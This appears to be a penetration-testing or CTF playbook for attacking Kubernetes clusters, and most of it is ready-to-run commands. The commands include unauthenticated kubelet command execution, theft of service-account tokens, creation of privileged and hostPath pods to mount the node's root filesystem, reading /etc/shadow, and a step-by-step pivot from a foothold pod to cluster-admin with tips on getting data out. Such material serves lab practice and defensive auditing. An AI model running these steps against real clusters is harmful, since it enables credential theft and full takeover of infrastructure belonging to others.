# Kubernetes — Recon, RBAC, kubelet API, Service Account Pivoting

## When this applies

- You have access to a Kubernetes cluster (via API server, kubelet, or pod foothold).
- Goal: enumerate pods/secrets, audit RBAC, escalate via kubelet API or SA token chains.

## Technique

`kubectl auth can-i --list` to see your permissions. From a foothold pod, read its SA token. Probe kubelet (port 10250) — often weaker auth than API. Pivot through SA tokens via multiple namespaces.

## Steps

### Kubernetes enumeration

```bash
# Check cluster info
kubectl cluster-info

# List namespaces
kubectl get namespaces

# List pods
kubectl get pods --all-namespaces

# List services
kubectl get services --all-namespaces

# Check RBAC permissions
kubectl auth can-i --list

# Check current permissions
kubectl auth can-i create pods
kubectl auth can-i '*' '*'

# Get service account token (from pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# List secrets
kubectl get secrets --all-namespaces

# Decode secret
kubectl get secret secret-name -o jsonpath='{.data.password}' | base64 -d

# Check for privileged pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.securityContext.privileged==true)'
```

### kube-hunter

```bash
# Install kube-hunter
pip install kube-hunter

# Run active scan (from outside)
kube-hunter --remote cluster-ip

# Run from within cluster
kube-hunter --pod

# Run specific tests
kube-hunter --active
```

### kube-bench (CIS Benchmark)

```bash
# Run kube-bench
docker run --pid=host --privileged -v /etc:/etc:ro -v /var:/var:ro \
  aquasec/kube-bench:latest run --targets master,node

# Or install and run
kube-bench run --targets master,node
```

### Kubernetes API testing

```bash
# Test anonymous access
curl -k https://kubernetes-api:6443/api/v1/namespaces

# With token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces

# Create privileged pod (if permissions allow)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attack-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attack
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

### Unauthenticated kubelet API exploitation (Port 10250)

```bash
# Kubelet API often has weaker auth than K8s API (8443)
# Test unauthenticated access — list all pods
curl -ks https://TARGET:10250/pods | jq '.items[].metadata | {name, namespace}'

# Execute commands in a pod (RCE as container root)
curl -ks https://TARGET:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"

# Extract service account token from pod
curl -ks https://TARGET:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Use SA token to enumerate permissions via SelfSubjectAccessReview
TOKEN="<extracted_token>"
curl -ks -X POST https://TARGET:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# If SA can create pods: mount host filesystem via hostPath
curl -ks -X POST https://TARGET:8443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"hostmount"},"spec":{"containers":[{"name":"c","image":"nginx","volumeMounts":[{"mountPath":"/hostfs","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'

# Read host files through the new pod via kubelet
curl -ks https://TARGET:10250/run/default/hostmount/c -d "cmd=cat /hostfs/etc/shadow"
```

**Key pattern**: kubelet (10250) → pod exec → SA token → K8s API (8443) → create hostPath pod → host filesystem. Even limited SA permissions (create pods only, no secrets) enable full host compromise.

### Kubernetes service-account token pivot (multi-namespace RBAC climb)

**Pattern in multi-pod k3s/Kubernetes clusters:**
A foothold pod's default SA in namespace A may have *no* useful permissions, but `pods` LIST in another namespace B is granted. Pivot:

1. **From foothold pod (default SA), list namespaces** via `curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces`. 403 on most resources is fine — keep walking.
2. **Probe each namespace** for `pods` listing — find one that returns a `PodList` (e.g., `dev`).
3. **Discover that pod's IP** from the listing. If the pod runs the *same vulnerable app* (often the case in lab/CTF environments), the same RCE/cmdi works against it from the foothold pod's network.
4. **Re-RCE the higher-priv pod** to dump *its* `/run/secrets/kubernetes.io/serviceaccount/token`. That token has different RBAC — typically can list `secrets` in `kube-system`.
5. **Search kube-system secrets** for a service-account token whose name contains `admin`/`cluster`/`c-admin`. Decode the `data.token` (base64) to get a JWT; the `sub` field reveals the SA (`system:serviceaccount:kube-system:c-admin`).
6. **Verify cluster-admin** by listing `nodes` or creating a `Namespace`. If success → full cluster compromise.

### Read host filesystem after cluster-admin

- `image: alpine` will fail if cluster has no internet egress (`image can't be pulled`). **Always reuse a local-registry image** discovered in existing pod specs (e.g., `localhost:5000/node_server`).
- Pod with `volumes: [{name: hostfs, hostPath: {path: /}}]` and `mountPath: /host` exposes node root.
- Easiest exfil: have the container `cat` target files to **stdout**, then read pod logs via `GET /api/v1/namespaces/<ns>/pods/<name>/log` — no exec/SPDY needed.
- The host's `/root/root.txt` (and other privileged files) are at `/host/root/root.txt` inside the pod.

### Shell-output exfil through a load-balanced webapp pod

When the foothold is a webapp running as a multi-replica `Deployment`, each HTTP request may hit a different pod. Files written to one pod's local FS are invisible to others — and the LFI read endpoint may go to a different pod than the upload one.

- **Solution:** repeat the upload (write) **N times** (≥10) so most pods receive the file, then retry the LFI read with backoff until one pod returns content.
- Alternatively send all output to **stdout of a one-shot pod** and read it via Kubernetes `pods/log` API — single source of truth.

### Common Kubernetes vulnerabilities

- **Anonymous Access**: Unauthenticated API access
- **RBAC Misconfigurations**: Excessive permissions
- **Exposed Dashboard**: Public Kubernetes dashboard
- **Privileged Pods**: securityContext.privileged
- **HostPath Mounts**: Mounting host filesystem
- **Secrets Management**: Unencrypted secrets

## Verifying success

- `kubectl auth can-i '*' '*'` returns `yes` for cluster-admin path.
- kubelet `/run/<ns>/<pod>/<container>` returns command output.
- HostPath pod reveals host filesystem (`cat /host/etc/shadow`).

## Common pitfalls

- Modern clusters disable anonymous access — kubelet may also require client cert.
- Some clusters use Workload Identity (no SA token in pod) — token must come from metadata server.
- Pod-creation paths may be restricted by PSA / OPA — try DaemonSet / Deployment if Pod fails.

## Tools

- kubectl, kube-hunter, kube-bench, kubeaudit, kubeletctl
- Trivy (image scanner)
- DeepCE
- Falco (runtime detection — useful when defending)
